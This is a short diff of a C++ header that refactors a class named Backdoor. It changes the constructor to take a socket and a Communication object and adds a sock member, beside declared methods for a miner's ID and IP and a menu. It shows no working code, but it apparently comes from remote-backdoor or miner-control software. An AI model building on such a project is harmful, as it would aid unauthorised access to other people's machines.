@@ -11,13 +11,12 @@ public:
     std::string get_miner_id();
     std::string get_miner_ip();
     void menu();
-    Backdoor(char *, int, bool);
+    Backdoor(int, Communication *, bool);
 
 private:
-
-    Communication *c;
+    Communication * c;
     bool is_server;
-
+    int sock;
 };
 
 
